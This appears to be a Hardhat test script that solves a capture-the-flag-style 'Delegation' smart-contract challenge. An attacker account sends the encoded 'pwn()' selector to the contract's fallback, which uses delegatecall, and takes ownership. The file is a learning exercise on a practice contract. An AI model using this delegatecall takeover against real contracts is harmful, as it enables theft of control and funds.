const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Delegate", () => {
  before(async function () {
    this.DelegateFactory = await ethers.getContractFactory("Delegate");
    this.DelegationFactory = await ethers.getContractFactory("Delegation");
    [owner, attacker] = await ethers.getSigners();
    (this.owner = owner), (this.attacker = attacker);
  });

  beforeEach(async function () {
    this.delegateContract = await this.DelegateFactory.deploy(
      this.owner.address
    );
    await this.delegateContract.deployed();
    this.delegationContract = await this.DelegationFactory.deploy(
      this.delegateContract.address
    );
    await this.delegationContract.deployed();
  });

  it("Attacker should not be the owner initially", async function () {
    expect(await this.delegationContract.owner()).to.not.equal(
      this.attacker.address
    );
  });

  it("Should be able to claim ownership", async function () {
    // connect with the attacker account
    this.delegationContract = await this.delegationContract.connect(
      this.attacker.address
    );

    //https://github.com/ethers-io/ethers.js/issues/478
    const ABI = ["function pwn()"];
    const iface = new ethers.utils.Interface(ABI);
    const encoded = iface.encodeFunctionData("pwn");

    await this.attacker.sendTransaction({
      to: this.delegationContract.address,
      data: encoded,
    });
    expect(await this.delegationContract.owner()).to.equal(
      this.attacker.address
    );
  });
});
